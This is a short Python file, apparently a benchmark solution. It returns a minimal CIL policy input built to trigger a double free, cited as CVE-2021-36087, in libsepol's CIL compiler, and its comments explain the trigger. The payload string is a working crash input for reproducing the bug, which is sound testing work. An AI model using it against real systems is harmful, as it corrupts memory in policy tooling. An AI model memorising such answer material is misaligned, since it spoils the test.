import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The vulnerability (CVE-2021-36087) is a Heap Use After Free (Double Free) in libsepol's CIL compiler.
        It occurs when an anonymous classpermission is passed as an argument to a macro, 
        and that argument is used within a classpermissionset rule inside the macro.
        During AST destruction, the anonymous classpermission is freed twice.
        """
        # Minimal CIL policy to trigger the issue:
        # 1. Define a class 'c' with permission 'p'
        # 2. Define a macro 'm' taking a 'classpermission' argument 'x'
        #    Inside, use 'x' in a classpermissionset rule
        # 3. Call 'm' passing an anonymous classpermission '(c (p))'
        return b"(class c (p))(macro m ((classpermission x)) (classpermissionset x (c (p))))(call m ((c (p))))"